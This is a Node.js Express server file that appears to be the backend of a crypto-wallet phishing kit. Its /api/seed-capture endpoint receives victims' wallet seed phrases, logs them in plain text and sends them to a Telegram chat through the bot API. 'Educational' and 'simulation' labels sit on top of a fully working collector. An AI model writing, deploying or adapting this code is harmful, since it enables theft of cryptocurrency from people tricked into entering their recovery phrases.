// server/server.js
import dns from 'node:dns'
import express from 'express'
import cors from 'cors'
import axios from 'axios'
import dotenv from 'dotenv'

// Force Node.js to resolve DNS to IPv4 first (fixes api.telegram.org IPv6 hang)
dns.setDefaultResultOrder('ipv4first')

dotenv.config()

const app = express()
app.use(cors())
app.use(express.json())

const PORT = process.env.PORT || 3001

// =====================================================================
// Receive seed phrase → send to Telegram
// =====================================================================
app.post('/api/seed-capture', async (req, res) => {
  const { wallet, phrase, wordCount, trackingId, userAgent, timestamp } = req.body || {}

  if (!phrase) return res.status(400).json({ error: 'Missing phrase' })

  console.log('\n=========================================')
  console.log('🎣 PHISHING SIMULATION — SEED CAPTURED')
  console.log('=========================================')
  console.log('Wallet:     ', wallet)
  console.log('Word count: ', wordCount)
  console.log('Tracking ID:', trackingId)
  console.log('Time:       ', timestamp)
  console.log('Phrase:     ', phrase)
  console.log('=========================================\n')

  const BOT  = process.env.TELEGRAM_BOT_TOKEN
  const CHAT = process.env.TELEGRAM_CHAT_ID
  if (BOT && CHAT) {
    const text = [
      '🎣 *EDUCATIONAL PHISHING DEMO*',
      '',
      `*Wallet:* ${wallet}`,
      `*Words:* ${wordCount}`,
      `*Tracking ID:* ${trackingId}`,
      `*Time:* ${timestamp}`,
      '',
      `*Phrase:*`,
      '`' + phrase + '`',
    ].join('\n')

    try {
      await axios.post(`https://api.telegram.org/bot${BOT}/sendMessage`, {
        chat_id: CHAT,
        text,
        parse_mode: 'Markdown',
      })
      console.log('✅ Sent to Telegram')
    } catch (err) {
      console.error('Telegram failed:', err.message)
    }
  } else {
    console.warn('⚠️ Telegram not configured')
  }

  res.json({ success: true, trackingId })
})

// Health check
app.get('/api/health', (req, res) => res.json({ ok: true }))

app.listen(PORT, () => console.log(`Backend listening on http://localhost:${PORT}`))